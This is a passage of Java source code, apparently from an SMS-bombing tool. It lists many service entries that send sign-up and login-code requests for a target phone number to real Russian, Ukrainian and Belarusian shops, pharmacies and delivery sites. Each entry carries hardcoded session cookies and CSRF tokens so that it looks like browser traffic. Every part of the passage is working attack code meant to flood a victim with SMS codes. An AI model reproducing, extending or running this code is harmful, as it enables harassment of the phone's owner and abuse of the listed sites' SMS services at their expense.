                new FormService("https://lgcity.ru/ajax/Auth/SmsSend/", 7) {
                    @Override
                    public void buildBody(Phone phone) {
                        request.header("Cookie", "PHPSESSID=da0ae7267bc7ddfd90f0889480d4d085; BITRIX_SM_SALE_UID=5b4cfc3515c34440d1cf6ea22394ab59; BITRIX_CONVERSION_CONTEXT_s1={\"ID\":26,\"EXPIRE\":1674680340,\"UNIQUE\":[\"conversion_visit_day\"]}; _gcl_au=1.1.163192587.1674663975; gcui=; gcmi=; gcvi=wWADW9wriPy; gcsi=6bJuwtfX9Lz; _ga_VNL8C6TDCT=GS1.1.1674663974.1.0.1674663974.60.0.0; _userGUID=0:ldbvowwn:nBkMAkH9uu99paTQuoBnLmL98~tM2Zbx; dSesn=ba8dac07-8441-e0c7-293d-95752020ff1f; _dvs=0:ldbvowwn:hksdtJfkhFdL~4nxL2OInJymXImxwiqt; rrpvid=327485701988044; _ga=GA1.2.1796131279.1674663975; _gid=GA1.2.2005589581.1674663975; _gat_UA-97400312-1=1; _gat_UA-97400312-2=1; advcake_trackid=ce50e0d8-19df-6d97-4c48-b44dc3f3c801; advcake_session_id=c0a5c8eb-5152-7d93-4ce6-841e77f74775; _spx=eyJpZCI6IjNmMmZjNTM4LWRiMzAtNDViZC05ZDA3LTNhYTRkNDUwYjNiZCIsImZpeGVkIjp7InN0YWNrIjpbMF19fQ==; tmr_lvid=2fcc8a7885309fab71d1edf23778c5b6; tmr_lvidTS=1674663974919; BX_USER_ID=d7f672cdeaafc9313a532a213faa66f4; flocktory-uuid=52c1b31a-3ef1-4f6d-aef4-84de50a73b8b-9; _ym_uid=1674663975775501735; _ym_d=1674663975; rcuid=6275fcd65368be000135cd22; _ym_isad=2; adrdel=1; adrcid=AcfKdvTX6GPzrDfQ1SkjAtw; gdeslon.ru.__arc_domain=gdeslon.ru; gdeslon.ru.user_id=4a291964-49f2-48d8-b032-a6c1ac8bba17; analytic_id=1674663975901861; X-User-DeviceId=b4aa683f-bc4f-466c-b63b-03742adec072; tmr_detect=0|1674663977585");

                        builder
                                .add("sessid", "caf528b4945730425049253f61b8a931")
                                .add("phone", Phone.format(phone.getPhone(), "+7 (***) ***-****"))
                                .add("code", "")
                                .add("smsSubscription", "Y");
                    }
                },

                new FormService("https://uvi.ru/checkout/confirmphone/", 7) {
                    @Override
                    public void buildBody(Phone phone) {
                        request
                                .header("Cookie", "PHPSESSID=jn5jd00qnmbnvrq01sn256i19m; country=ru; subscriberscount=40931; rrpvid=694048253200853; _gcl_au=1.1.1938001345.1674664208; gtm-session-start=1674664207046; tmr_lvid=a84a77db9c2e8ce8bb69ac52a3baa750; tmr_lvidTS=1648232173669; rcuid=6275fcd65368be000135cd22; _gid=GA1.2.1729860355.1674664208; _gat_UA-88245946-1=1; _ym_uid=1648232174286051462; _ym_d=1674664208; _ym_isad=2; _ym_visorc=b; _gpVisits={\"isFirstVisitDomain\":true,\"todayD\":\"Wed Jan 25 2023\",\"idContainer\":\"10002541\"}; __url_history=[\"https://uvi.ru/user/#personal\",\"https://uvi.ru/online/\"]; page=https://uvi.ru/user/; number_page=2; _ga_DF5LLGTRWL=GS1.1.1674664207.1.1.1674664243.24.0.0; _ga=GA1.1.576427288.1674664208; _ga_1SCL2WEMLV=GS1.1.1674664208.1.1.1674664243.0.0.0; _gp10002541={\"hits\":2,\"vc\":1,\"ac\":1,\"a6\":1}; tmr_detect=0|1674664245896")
                                .header("x-requested-with", "XMLHttpRequest");

                        builder
                                .add("phone", phone.toString())
                                .add("from", "point_7");
                    }
                },

                new JsonService("https://api3.pomogatel.ru/accounts", 7) {
                    @Override
                    public String buildJson(Phone phone) {
                        request.header("session-details", "a04df5cb-0ba1-4f7c-8f44-4b7033e74711:9fee9170-37f5-4b42-8858-2763781932a4");
                        request.header("user-language", "ru-RU");
                        request.header("platform", "web");

                        return "{\"address\":\"Москва, 2-я Владимирская\",\"country\":\"Россия\",\"locality\":\"Москва\",\"street\":\"2-я Владимирская улица\",\"latitude\":\"55.751264\",\"longitude\":\"37.784524\",\"roleId\":2,\"phoneNumber\":\"" + phone.getPhone()
                                + "\",\"phoneNumberMasked\":\"" + Phone.format(phone.getPhone(), "+7(***)***-**-**")
                                + "\",\"type\":\"phone\",\"specializationId\":2}";
                    }
                },

                new FormService("https://posudacenter.ru/bitrix/services/main/ajax.php?mode=class&c=itc%3Auser.phone.auth&action=processPhoneRequest", 7) {
                    @Override
                    public void buildBody(Phone phone) {
                        request.header("Cookie", "BITRIX_SM_SALE_UID=f9011e478173d3870a10f5076d743cbd; BITRIX_SM_DASHAMAIL_CUSTOMER_ID=132020738; _ym_uid=1674041421803538; _ym_d=1674041421; BX_USER_ID=d7f672cdeaafc9313a532a213faa66f4; _ga=GA1.2.2033826660.1674041422; PHPSESSID=ham0ch0hqj0cskpivas0k44lod; _ym_visorc=w; _ym_debug=null; BITRIX_CONVERSION_CONTEXT_s1={\"ID\":1,\"EXPIRE\":1674665940,\"UNIQUE\":[\"conversion_visit_day\"]}; _ym_isad=2; _gid=GA1.2.1404411929.1674664973; _gat_UA-15836682-2=1; BITRIX_SM_LAST_VISIT=25.01.2023+23:42:55");

                        builder
                                .add("phone", Phone.format(phone.getPhone(), "+7 (***) ***-**-**"))
                                .add("userType", "fiz")
                                .add("inn", "undefined")
                                .add("SITE_ID", "s1")
                                .add("sessid", "4ddded3364cf8c6c6c43a3d0d0f7c773");
                    }
                },

                new JsonService("https://lk.mysbertips.ru/sbrftips-proxy/registration/newotp", 7) {
                    @Override
                    public String buildJson(Phone phone) {
                        request.header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edg/109.0.1518.61");
                        request.header("Cookie", "SESSION=NDJiYWE0MmUtMWNjMy00YmFmLWIyZWMtMTRkZDNjNGQwMWM3; _ym_uid=1674665215289598227; _ym_d=1674665215; _sa=SA1.2d07e266-09de-4fa9-b232-1d8a9ef458e3.1674665214; adtech_uid=24a2176e-f8b2-4682-812e-326068cb377d:mysbertips.ru; user-id_1.0.5_lr_lruid=pQ8AAP9c0WMDffReAW1bjQA=; _ym_isad=2; _ym_visorc=w");

                        try {
                            return new JSONObject()
                                    .put("login", phone.getPhone())
                                    .toString();
                        } catch (JSONException e) {
                            return null;
                        }
                    }
                },

                new ParamsService("https://www.elmarket.by/public/ajax/sms_reg.php", 375) {
                    @Override
                    public void buildParams(Phone phone) {
                        request
                                .header("X-Requested-With", "XMLHttpRequest")
                                .header("Cookie", "PHPSESSID=75ffo2jbrgiilp6ru01ehorsg3; BITRIX_SM_WATCHER_REFERER_ID=11; _fbp=fb.1.1674666273780.2098848882; BITRIX_SM_BUYER_ID=34615018; BITRIX_SM_BUYER_KEY=78ba6e6eb4bb251a38225386e8883b19; BX_USER_ID=d7f672cdeaafc9313a532a213faa66f4");

                        builder
                                .addQueryParameter("phone", Phone.format(phone.getPhone(), "+375 (**) ***-**-**"))
                                .addQueryParameter("code", "")
                                .addQueryParameter("UF_REG_AGREE_PERS", "Y");
                    }
                },

                new FormService("https://28opt.ru/auth/?auth_action=code", 7) {
                    @Override
                    public void buildBody(Phone phone) {
                        request
                                .header("Cookie", "PHPSESSID=cu3a1iqvjgvgln91dlktlca8p4; searchbooster_v2_user_id=S0c3ptgA9oAAoL6eFqZzM_Wrq6ySCEdg-DSLLUc1Kk2|0.26.18.31; tmr_lvid=0895366bd07f8a6b958d1661d9bcd570; tmr_lvidTS=1674747099735; global_uuid=0HGZEad2MZ5RRZMfE; convead_guest_uid=qZh4GeGBA7vZJse3h; _ga=GA1.2.927248970.1674747101; _gid=GA1.2.803544588.1674747101; _gat_gtag_UA_96988994_1=1; cc=RU; roistat_visit=3938253; roistat_first_visit=3938253; roistat_visit_cookie_expire=1209600; roistat_is_need_listen_requests=0; roistat_is_save_data_in_cookie=1; _ym_uid=1674747101384999675; _ym_d=1674747101; roistat_cookies_to_resave=roistat_ab,roistat_ab_submit,roistat_visit; _ym_isad=2; _ym_visorc=w; ___dc=f3b4266b-e7d2-4e14-8377-4362f6faa4f3; tmr_detect=0|1674747103084; convead_widget_closed_116694=116694")
                                .header("X-Requested-With", "XMLHttpRequest");

                        builder
                                .add("set_action", "register")
                                .add("countryID", "109")
                                .add("user_phone", Phone.format(phone.getPhone(), "(***) ***-**-**"));
                    }
                },

                new FormService("https://vladimir.holodilnik.ru/ajax/user/get_tpl.php?96.22364161776159", 7) {
                    @Override
                    public void buildBody(Phone phone) {
                        request
                                .header("Cookie", "region_position_nn=24; clean=1; new_home=2; oneclick_order=1; new_reg=2; HRUSID=8f3a403f8f1002b7df0cdc1234b5b834; HRUSIDLONG=8a51a897e72d705cfb0f2d4c1a1ebf6a; csrfnews=8ac641e766c183e782f0706756539ab3; mindboxdbg=0; tmr_lvid=668db02d45d79ad233216bc3a7aef88b; tmr_lvidTS=1673961864893; _ga=GA1.2.1588267531.1673961865; _ym_uid=1673961868198063374; _ym_d=1673961868; _userGUID=0:ld09oc00:Kr2KhQWKzm~voxxbrrmT4bSCUcN8nho_; advcake_track_id=5dd8b4db-6078-ae09-d2bf-7659a208454f; advcake_session_id=ccac051d-b53e-53bb-7567-61fae11a8ee8; flocktory-uuid=e429bd85-39fc-4d6b-9b57-d6abe16258af-3; wtb_sid=null; popmechanic_sbjs_migrations=popmechanic_1418474375998=1|||1471519752600=1|||1471519752605=1; _gpVisits={\"isFirstVisitDomain\":true,\"todayD\":\"Tue Jan 17 2023\",\"idContainer\":\"1000247C\"}; adrcid=A0WchnQwBnxZ1EMPWxqzT3A; aprt_last_partner=actionpay; aprt_last_apclick=; aprt_last_apsource=1; _ga_EHP29G0JCQ=GS1.1.1673978244.2.0.1673978244.0.0.0; OrderUserType=1; HRUSIDSHORT=01933d4afb396c7405ee9f30809b3582; _utmx=8f3a403f8f1002b7df0cdc1234b5b834; _gid=GA1.2.1622488607.1674747661; dSesn=a33b4119-8977-a5c5-1cc4-72a8c3cdbddf; _dvs=0:ldd9im3g:~~w7twQuttk6ru660celwXTh1ZSeWppu; _ym_isad=2; _ubtcuid=cldd9im7p00003nbnukki9pu6; action_blocks=; banners_rotations=1067; _utmz=2cebd56ce5cbf15d6e6fdaa7d46aa40551ade24425f8530e480df12b1823376e; _sp_ses.4b6a=*; mindboxDeviceUUID=bb0643e8-bc08-4838-bf34-5b23a4221287; directCrm-session={\"deviceGuid\":\"bb0643e8-bc08-4838-bf34-5b23a4221287\"}; tmr_detect=0|1674747664191; PHPSESSID=503437c08856d897c7942267cb62eab0; _gat=1; _sp_id.4b6a=3ce0c76f-2b49-434d-9fdf-7a5ce8f9fb30.1673961869.2.1674747882.1673961984.a30f1324-8eca-4544-9a3c-3572d897dccf")
                                .header("X-Requested-With", "XMLHttpRequest");

                        builder
                                .add("ajkey", "cf0ed62da76642fc510e517210addd06")
                                .add("ajform", "LOGIN_FORM")
                                .add("ajaction", "GET_CODE")
                                .add("ajphoneORemail", "+" + phone)
                                .add("ajverifycode", "")
                                .add("ajUserType", "1")
                                .add("ajConfPhone", "")
                                .add("ajConfEmail", "")
                                .add("ajPswd", "")
                                .add("ajSubMode", "");
                    }
                },

                new FormService("https://vladimir.holodilnik.ru/ajax/user/get_tpl.php?49.27456348655404", 7) {
                    @Override
                    public void buildBody(Phone phone) {
                        request
                                .header("Cookie", "region_position_nn=24; clean=1; new_home=2; oneclick_order=1; new_reg=2; HRUSID=8f3a403f8f1002b7df0cdc1234b5b834; HRUSIDLONG=8a51a897e72d705cfb0f2d4c1a1ebf6a; csrfnews=8ac641e766c183e782f0706756539ab3; mindboxdbg=0; tmr_lvid=668db02d45d79ad233216bc3a7aef88b; tmr_lvidTS=1673961864893; _ga=GA1.2.1588267531.1673961865; _ym_uid=1673961868198063374; _ym_d=1673961868; _userGUID=0:ld09oc00:Kr2KhQWKzm~voxxbrrmT4bSCUcN8nho_; advcake_track_id=5dd8b4db-6078-ae09-d2bf-7659a208454f; advcake_session_id=ccac051d-b53e-53bb-7567-61fae11a8ee8; flocktory-uuid=e429bd85-39fc-4d6b-9b57-d6abe16258af-3; wtb_sid=null; popmechanic_sbjs_migrations=popmechanic_1418474375998=1|||1471519752600=1|||1471519752605=1; _gpVisits={\"isFirstVisitDomain\":true,\"todayD\":\"Tue Jan 17 2023\",\"idContainer\":\"1000247C\"}; adrcid=A0WchnQwBnxZ1EMPWxqzT3A; aprt_last_partner=actionpay; aprt_last_apclick=; aprt_last_apsource=1; _ga_EHP29G0JCQ=GS1.1.1673978244.2.0.1673978244.0.0.0; OrderUserType=1; HRUSIDSHORT=01933d4afb396c7405ee9f30809b3582; _utmx=8f3a403f8f1002b7df0cdc1234b5b834; _gid=GA1.2.1622488607.1674747661; dSesn=a33b4119-8977-a5c5-1cc4-72a8c3cdbddf; _dvs=0:ldd9im3g:~~w7twQuttk6ru660celwXTh1ZSeWppu; _ym_isad=2; _ubtcuid=cldd9im7p00003nbnukki9pu6; action_blocks=; banners_rotations=1067; _utmz=2cebd56ce5cbf15d6e6fdaa7d46aa40551ade24425f8530e480df12b1823376e; _sp_ses.4b6a=*; mindboxDeviceUUID=bb0643e8-bc08-4838-bf34-5b23a4221287; directCrm-session={\"deviceGuid\":\"bb0643e8-bc08-4838-bf34-5b23a4221287\"}; tmr_detect=0|1674747664191; PHPSESSID=503437c08856d897c7942267cb62eab0; _gat=1; _sp_id.4b6a=3ce0c76f-2b49-434d-9fdf-7a5ce8f9fb30.1673961869.2.1674747882.1673961984.a30f1324-8eca-4544-9a3c-3572d897dccf")
                                .header("X-Requested-With", "XMLHttpRequest");

                        builder
                                .add("ajkey", "cf0ed62da76642fc510e517210addd06")
                                .add("ajform", "LOGIN_FORM")
                                .add("ajaction", "PUSH_MOBILE_ID")
                                .add("ajphoneORemail", "+" + phone)
                                .add("ajverifycode", "")
                                .add("ajUserType", "1")
                                .add("ajConfPhone", "")
                                .add("ajConfEmail", "")
                                .add("ajPswd", "")
                                .add("ajSubMode", "");
                    }
                },

                new Service(380) {
                    @Override
                    public void run(OkHttpClient client, Callback callback, Phone phone) {
                        client.newCall(new Request.Builder()
                                .url("https://online-apteka.com.ua/assets/components/ajaxfrontend/action.php")
                                .headers(new Headers.Builder()
                                        .add("x-requested-with", "XMLHttpRequest")
                                        .addUnsafeNonAscii("Cookie", "PHPSESSID=ovtn4q0g3f4g1c3mdnkuu94gon; msfavorites=ovtn4q0g3f4g1c3mdnkuu94gon; lastContext=web; _gid=GA1.3.2033245176.1674752800; _gat_gtag_UA_88170340_1=1; _ga_3SRTFP3H03=GS1.1.1674752799.1.1.1674752804.0.0.0; _ga=GA1.3.1765539140.1674752800; biatv-cookie={\"firstVisitAt\":1674752799,\"visitsCount\":1,\"campaignCount\":1,\"currentVisitStartedAt\":1674752799,\"currentVisitLandingPage\":\"https://online-apteka.com.ua/\",\"currentVisitOpenPages\":2,\"location\":\"https://online-apteka.com.ua/auth.html\",\"locationTitle\":\"Вход\\\\Регистрация - Мед-Сервис\",\"userAgent\":\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edg/109.0.1518.61\",\"language\":\"ru\",\"encoding\":\"utf-8\",\"screenResolution\":\"1536x864\",\"currentVisitUpdatedAt\":1674752802,\"utmDataCurrent\":{\"utm_source\":\"(direct)\",\"utm_medium\":\"(none)\",\"utm_campaign\":\"(direct)\",\"utm_content\":\"(not set)\",\"utm_term\":\"(not set)\",\"beginning_at\":1674752799},\"campaignTime\":1674752799,\"utmDataFirst\":{\"utm_source\":\"(direct)\",\"utm_medium\":\"(none)\",\"utm_campaign\":\"(direct)\",\"utm_content\":\"(not set)\",\"utm_term\":\"(not set)\",\"beginning_at\":1674752799},\"geoipData\":{\"country\":\"Poland\",\"region\":\"Mazovia\",\"city\":\"Warsaw\",\"org\":\"\"}}; bingc-activity-data={\"numberOfImpressions\":0,\"activeFormSinceLastDisplayed\":0,\"pageviews\":1,\"callWasMade\":0,\"updatedAt\":1674752810}")
                                        .build())
                                .post(RequestBody.create("------WebKitFormBoundaryKJ1G3JA5mtkOMt2e\n" +
                                                "Content-Disposition: form-data; name=\"login\"\n" +
                                                "\n" +
                                                Phone.format(phone.getPhone(), "+38 (0**) ***-**-**") +
                                                "\n------WebKitFormBoundaryKJ1G3JA5mtkOMt2e\n" +
                                                "Content-Disposition: form-data; name=\"action\"\n" +
                                                "\n" +
                                                "generatePassword\n" +
                                                "------WebKitFormBoundaryKJ1G3JA5mtkOMt2e\n" +
                                                "Content-Disposition: form-data; name=\"hash\"\n" +
                                                "\n" +
                                                "1b0e6c59bf26361ac6b9d382fb515f2b\n" +
                                                "------WebKitFormBoundaryKJ1G3JA5mtkOMt2e\n" +
                                                "Content-Disposition: form-data; name=\"hash_dynamic\"\n" +
                                                "\n" +
                                                "5111af00ece822750e74d295aa17f79f\n" +
                                                "------WebKitFormBoundaryKJ1G3JA5mtkOMt2e\n" +
                                                "Content-Disposition: form-data; name=\"context\"\n" +
                                                "\n" +
                                                "web\n" +
                                                "------WebKitFormBoundaryKJ1G3JA5mtkOMt2e\n" +
                                                "Content-Disposition: form-data; name=\"page_id\"\n" +
                                                "\n" +
                                                "58886\n" +
                                                "------WebKitFormBoundaryKJ1G3JA5mtkOMt2e\n" +
                                                "Content-Disposition: form-data; name=\"page_url\"\n" +
                                                "\n" +
                                                "/auth.html\n" +
                                                "------WebKitFormBoundaryKJ1G3JA5mtkOMt2e--",
                                        MediaType.parse("multipart/form-data; boundary=----WebKitFormBoundaryKJ1G3JA5mtkOMt2e")))
                                .build()).enqueue(callback);
                    }
                },

                new JsonService("https://anc.ua/authorization/auth/v2/register", 380) {
                    @Override
                    public String buildJson(Phone phone) {
                        request.header("Cookie", "auth.strategy=local; auth._token.local=false; auth._refresh_token.local=false; city=5; _gid=GA1.2.2014301269.1674753416; _fbp=fb.1.1674753418996.1198222138; _ga_36VHWFTBMP=GS1.1.1674753419.1.0.1674753419.60.0.0; sc=35564E72-62BB-B2D6-FDA0-BFBA8391ED2D; _ga=GA1.2.117128623.1674753416; _dc_gtm_UA-169190421-1=1");

                        try {
                            return new JSONObject()
                                    .put("login", "+" + phone)
                                    .toString();
                        } catch (JSONException e) {
                            return null;
                        }
                    }
                },

                new FormService("https://rnr.com.ua/sms/send", 380) {
                    @Override
                    public void buildBody(Phone phone) {
                        builder.add("phone_number", Phone.format(phone.getPhone(), "+38 (0**) *** ** **"));

                        request
                                .header("x-csrf-token", "PeCkfQTNSESvpofMgX2bRlSqk7Ab5rkSZ38dHY1a")
                                .header("x-csrftoken", "PeCkfQTNSESvpofMgX2bRlSqk7Ab5rkSZ38dHY1a")
                                .header("x-requested-with", "XMLHttpRequest");
                    }
                },

                new MultipartService("https://woodman.by/resource/themes/woodman/action/login/verify.php?register=true", 375) {
                    @Override
                    public void buildBody(Phone phone) {
                        request.header("Cookie", "PHPSESSID=95a6b858b762b5b1553ddcf65bfaee04; _gcl_au=1.1.734651332.1675604508; _gid=GA1.2.1783988263.1675604508; _gat_gtag_UA_180993361_1=1; _dc_gtm_UA-180993361-1=1; _ym_uid=1675604508910510402; _ym_d=1675604508; _fbp=fb.1.1675604507962.2028429428; _ym_isad=2; _ym_visorc=w; _ga=GA1.2.399891246.1675604508; _ga_HZKXP3YNMT=GS1.1.1675604507.1.1.1675604511.0.0.0; welcome-cookie=true");

                        builder.addFormDataPart("phone", Phone.format(phone.getPhone(), "+375 (**) ***-**-**"));
                        builder.addFormDataPart("country", "by");
                        builder.addFormDataPart("password", "");
                        builder.addFormDataPart("code", "");
                    }
                },

                new JsonService("https://api.sunlight.net/v3/customers/authorization/", 7) {
                    @Override
                    public String buildJson(Phone phone) {
                        request.headers(new Headers.Builder()
                                .add("X-Requested-With", "SunlightFrontendApp")
                                .addUnsafeNonAscii("Cookie", "city_auto_popup_shown=1; region_id=a2abfdde-54eb-43c0-981c-644657238a3c; region_subdomain=\"\"; ccart=off; session_id=1b7ddd46-ee43-443f-9faa-b0274689f4ab; tmr_lvid=220061aaaf4f8e8ab3c3985fb53cb3f3; tmr_lvidTS=1659884104985; _ga=GA1.2.1099609403.1670778978; _gid=GA1.2.1444923732.1670778978; _gat_test=1; _gat_UA-11277336-11=1; _gat_UA-11277336-12=1; _gat_owox=1; _tt_enable_cookie=1; _ttp=a3a48ff1-8e5d-407d-8995-dc4e7ca99913; _ym_uid=1659884110990105023; _ym_d=1670778978; _ym_isad=2; _ym_visorc=b; popmechanic_sbjs_migrations=popmechanic_1418474375998=1|||1471519752600=1|||1471519752605=1; _ga_HJNSJ6NG5J=GS1.1.1670778977.1.0.1670778980.57.0.0; auid=1196ce38-5136-4290-bf14-e29d02d50fa7:1p4Pw3:gOobko9I_s6h9Ng8IWQXyNN-TejCW4-SO1-lN7_LLjQ; mindboxDeviceUUID=bb0643e8-bc08-4838-bf34-5b23a4221287; directCrm-session={\"deviceGuid\":\"bb0643e8-bc08-4838-bf34-5b23a4221287\"}")
                                .build());

                        try {
                            return new JSONObject()
                                    .put("phone", phone)
                                    .toString();
                        } catch (JSONException e) {
                            return null;
                        }
                    }
                },

                new FormService("https://belwest.ru/ru/register/sendCode", 7) {
                    @Override
                    public void buildBody(Phone phone) {
                        request.header("Cookie", "JSESSIONID=DAEB96067C145BA51D45DE3EE71EF08B; cookie-notification=NOT_ACCEPTED; _ym_uid=1676372248443153972; _ym_d=1676372248; _gid=GA1.2.1225929451.1676372248; _gat_UA-102366257-3=1; _gat_UA-102366257-1=1; _ym_visorc=w; _ym_isad=2; _ga=GA1.2.66513301.1676372247; _ga_2YRZCT7RNL=GS1.1.1676372247.1.1.1676372270.0.0.0; _ga_J6Y8MM53GK=GS1.1.1676372247.1.1.1676372280.0.0.0");
                        request.header("x-requested-with", "XMLHttpRequest");

                        builder.add("mobileNumber", phone.getPhone());
                        builder.add("mobileNumberCode", phone.getCountryCode());
                        builder.add("CSRFToken", "4f003297-5110-4c81-8c25-ca7857971d88");
                    }
                },

                new FormService("https://dostavka.dixy.ru/ajax/mp-auth-test.php", 7) {
                    @Override
                    public void buildBody(Phone phone) {
                        request.header("Cookie", "PHPSESSID=5ab480a3917eae435390edb75770783a; price_id=80; BITRIX_SID=6C68VRK27r; BITRIX_SM_SALE_UID=755ab7df02053be0e14760d64d16f5b9; _ym_debug=null; countmobile=2; usecookie=accept; BITRIX_CONVERSION_CONTEXT_s1={\"ID\":1,\"EXPIRE\":1676408340,\"UNIQUE\":[\"conversion_visit_day\"]}; _gid=GA1.2.1143019386.1676373558; _dc_gtm_UA-172001173-1=1; _ga=GA1.3.1377249881.1676373558; _gid=GA1.3.1143019386.1676373558; _gat_UA-172001173-1=1; _ym_uid=167637355813882176; _ym_d=1676373558; _ga_J3JT2KMN08=GS1.1.1676373558.1.0.1676373558.60.0.0; _ga=GA1.1.1377249881.1676373558; tmr_lvid=ea5f0ffa7ac4e6584f870de9a81d1313; tmr_lvidTS=1676373558371; BX_USER_ID=d7f672cdeaafc9313a532a213faa66f4; _ym_isad=2; _ym_visorc=w; tmr_detect=0|1676373561282");
                        request.header("x-requested-with", "XMLHttpRequest");

                        builder.add("phone", phone.toString());
                        builder.add("licenses_popup", "Y");
                        builder.add("licenses_popup1", "Y");
                        builder.add("licenses_popup2", "Y");
                    }
                },

                new FormService("https://uslugio.com/auth", 7) {
                    @Override
                    public void buildBody(Phone phone) {
                        request.header("Cookie", "ATQ2M9TvP=uyhf9pHeFsuRtykN2Ch8c1CvD7thZiYu-e8de6ef6b6079efd5249f34ec0af3083; homepage=1676374249; _ym_uid=1644855870735875783; _ym_d=1676374250; _ga_XSCF1FEP7P=GS1.1.1676374250.1.0.1676374250.0.0.0; _ym_isad=2; _ym_visorc=b; _ga=GA1.2.1506734768.1676374250; _gid=GA1.2.1390316506.1676374250; _gat_gtag_UA_213836366_1=1; _wl_cm=1676374250-60a933d");

                        builder.add("dologin", "1");
                        builder.add("phone", Phone.format(phone.getPhone(), "+7 (***) ***-**-**"));
                    }
                },

                new FormService("https://tb.tips4you.ru/auth/ajax/signup_action", 7) {
                    @Override
                    public void buildBody(Phone phone) {
                        request.header("Cookie", "PHPSESSID=boe2n8jajco2f38tol7o6htedr; _csrf=56a6833d81db55efdbbd72be737db8d3; _ym_uid=167637442891771139; _ym_d=1676374428; _ym_isad=2; _ym_visorc=w");
                        request.header("X-Requested-With", "XMLHttpRequest");

                        builder.add("phone", Phone.format(phone.getPhone(), "(***) ***-**-**"));
                        builder.add("step", "1");
                    }
                },

                new FormService("https://new.moy.magnit.ru/local/ajax/login/", 7) {
                    @Override
                    public void buildBody(Phone phone) {
                        builder.add("phone", Phone.format(phone.getPhone(), "+7 ( *** ) ***-**-**"));
                        builder.add("ksid", "225294bc-012e-4054-97c3-c4dbefb8f0af_0");

                        request.header("Sec-Fetch-Dest", "empty");
                        request.header("Sec-Fetch-Mode", "cors");
                        request.header("sec-ch-ua", "\"Chromium\";v=\"102\", \"Opera GX\";v=\"88\", \";Not A Brand\";v=\"99\"");
                        request.header("sec-ch-ua-mobile", "?0");
                        request.header("sec-ch-ua-platform", "\"Windows\"");
                        request.header("Sec-Fetch-Site", "same-site");

                        request.header("Cookie", "PHPSESSID=6e2s2jco3rvpi33tluqecad3kt; _gid=GA1.2.1116348124.1676383880; _gat_UA-61230203-9=1; _gat_UA-61230203-3=1; _ym_uid=1661249544448490865; _ym_d=1676383880; _clck=1j2pzux|1|f94|0; _ym_visorc=w; _ym_isad=2; _ga=GA1.4.490589619.1676383880; _gid=GA1.4.1116348124.1676383880; _gat_UA-61230203-5=1; BX_USER_ID=d7f672cdeaafc9313a532a213faa66f4; KFP_DID=fe822d3f-4a57-723d-2706-a9521f9bd17d; BITRIX_CONVERSION_CONTEXT_s1={\"ID\":1,\"EXPIRE\":1676408340,\"UNIQUE\":[\"conversion_visit_day\"]}; _clsk=vn6qns|1676383884870|2|1|i.clarity.ms/collect; _ga=GA1.2.490589619.1676383880; _ga_GW0P06R9HZ=GS1.1.1676383884.1.0.1676383893.0.0.0; oxxfgh=225294bc-012e-4054-97c3-c4dbefb8f0af#1#7884000000#5000#1800000#12840");
                    }
                },

                new JsonService("https://api.starterapp.ru/clubve/auth/resetCode", 7) {
                    @Override
                    public String buildJson(Phone phone) {
                        request.header("sessionid", "4041bd83-f1fe-4711-8efa-6ac31e81b3de");
                        try {
                            return new JSONObject()
                                    .put("phone", phone)
                                    .toString();
                        } catch (JSONException e) {
                            return null;
                        }
                    }
                },

                new JsonService("https://sushiwok.ru/user/phone/validate", 7) {
                    @Override
                    public String buildJson(Phone phone) {
                        request.header("x-csrf-token", "KxUtYXrV-FfrHJ6ZLIcCuyZqv7GSWVmfzf8M");
                        request.header("x-requested-with", "XMLHttpRequest");
                        request.header("cookie", "_csrf=p4ZnbhHfcQYr8Qbp0lGWTLlq; connect.sid=s:gqjmNZSZipi0Du2DyS9mWHQvB56fAS04.87oxCkV/g3cERTuw/eR2kzyKkzyH32Il1SnfYdZl6Js; _sticky_param=4; _gid=GA1.2.1525497464.1676386386; _gcl_au=1.1.1311383257.1676386386; tmr_lvid=d0323dada0a19b9780be03fd69d9b9bd; tmr_lvidTS=1651933668037; _gat_gtag_UA_88670217_1=1; _gat_ITRZ=1; _gat_SPB=1; _gat_GA=1; _ym_uid=1651933669991734830; _ym_d=1676386387; _ym_isad=2; parameterURL=https://sushiwok.ru/spb/profile/; lgvid=63eba053d2225a00019e6ffd; lgkey=a9068628303b848d1d311b37fa95b8a3; _ym_visorc=w; _tt_enable_cookie=1; _ttp=ceLZ07HWH_ygNJkoURbiQwbRQxW; tmr_detect=0|1676386389144; _ga_TE53H5X77H=GS1.1.1676386386.1.1.1676386389.0.0.0; _ga=GA1.2.232668185.1676386386; _gat_gtag_UA_88670217_10=1");
                        request.header("referer", "https://sushiwok.ru/spb/profile/");
                        request.header("Sec-Fetch-Dest", "empty");
                        request.header("Sec-Fetch-Mode", "cors");
                        request.header("sec-ch-ua", "\"Chromium\";v=\"102\", \"Opera GX\";v=\"88\", \";Not A Brand\";v=\"99\"");
                        request.header("sec-ch-ua-mobile", "?0");
                        request.header("sec-ch-ua-platform", "\"Windows\"");
                        request.header("Sec-Fetch-Site", "same-site");
                        request.header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.41");
                        request.header("origin", "https://sushiwok.ru");

                        try {
                            return new JSONObject()
                                    .put("phone", Phone.format(phone.getPhone(), "+7(***)***-**-**"))
                                    .put("numbers", "4")
                                    .toString();
                        } catch (JSONException e) {
                            return null;
                        }
                    }
                },

                new JsonService("https://spb.uteka.ru/rpc/?method=auth.GetCode", 7) {
                    @Override
                    public String buildJson(Phone phone) {
                        request
                                .header("platform", "Desktop")
                                .header("version", "299a1566")
                                .header("Cookie", "utid=uRELsmP93dxv200sAyHgAg==; _ym_uid=1677581792865430072; _ym_d=1677581792; _ym_isad=2; _gid=GA1.2.1174750557.1677581792; _gat_gtag_UA_117125065_1=1; _ga=GA1.1.567396639.1677581792; _ga_BQFFN693N9=GS1.1.1677581791.1.0.1677581799.0.0.0; _ym_visorc=b");

                        return "{\"jsonrpc\":\"2.0\",\"id\":7,\"method\":\"auth.GetCode\",\"params\":{\"phone\":\"" + phone.getPhone() + "\",\"mustExist\":false,\"sendRealSms\":true}}";
                    }
                },

                new FormService("https://planetazdorovo.ru/ajax/vigroup-p_a.php", 7) {
                    @Override
                    public void buildBody(Phone phone) {
                        request.headers(new Headers.Builder()
                                .add("Referer", "https://planetazdorovo.ru/lk/signin/")
